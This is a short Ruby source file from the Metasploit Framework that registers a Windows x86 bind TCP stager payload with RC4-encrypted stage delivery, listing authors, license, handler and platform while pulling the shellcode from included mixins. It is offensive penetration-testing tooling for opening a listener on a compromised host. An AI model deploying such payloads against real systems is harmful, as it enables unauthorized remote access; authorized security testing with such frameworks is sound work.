# -*- coding: binary -*-
##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

module MetasploitModule

  CachedSize = 415

  include Msf::Payload::Stager
  include Msf::Payload::Windows::BindTcpRc4

  def self.handler_type_alias
    "bind_tcp_rc4"
  end

  def initialize(info = {})
    super(merge_info(info,
      'Name'          => 'Bind TCP Stager (RC4 Stage Encryption, Metasm)',
      'Description'   => 'Listen for a connection',
      'Author'        => ['hdm', 'skape', 'sf', 'mihi', 'RageLtMan'],
      'License'       => MSF_LICENSE,
      'Platform'      => 'win',
      'Arch'          => ARCH_X86,
      'Handler'       => Msf::Handler::BindTcp,
      'Convention'    => 'sockedi',
      'Stager'        => { 'RequiresMidstager' => false }
      ))
  end
end
